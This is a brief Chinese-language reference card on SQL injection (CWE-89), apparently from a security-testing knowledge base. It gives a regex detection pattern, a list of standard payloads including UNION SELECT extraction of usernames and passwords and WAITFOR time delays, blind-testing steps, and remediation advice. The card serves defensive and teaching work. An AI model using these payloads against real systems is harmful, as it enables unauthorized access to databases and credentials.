# SQL Injection Pattern

## 基本信息

| 属性 | 值 |
|------|-----|
| 类型 | Injection |
| CWE | CWE-89 |
| 严重性 | Critical |
| CVSS | 9.8-10.0 |

## 检测模式

```regex
(\b(union|select|insert|update|delete|drop|exec|execute)\b.*){2,}
```

## 常用 Payload

```sql
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
" OR "1"="1
" OR "1"="1" --
" OR "1"="1" /*
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT username,password FROM users--
' WAITFOR DELAY '00:00:05'--
```

## 检测步骤

1. **识别注入点**: 寻找用户输入未经过滤的参数
2. **布尔盲注测试**: 添加 `' AND '1'='1` 和 `' AND '1'='2`
3. **时间盲注测试**: 添加 `'; WAITFOR DELAY '00:00:05'--`
4. **联合查询**: `UNION SELECT` 探测列数
5. **数据提取**: 逐步提取数据库内容

## 修复建议

- 使用参数化查询 (Prepared Statements)
- 输入验证和过滤
- 使用 ORM 框架
- 最小权限原则

## 参考

- https://owasp.org/www-community/attacks/SQL_Injection
- https://portswigger.net/web-security/sql-injection
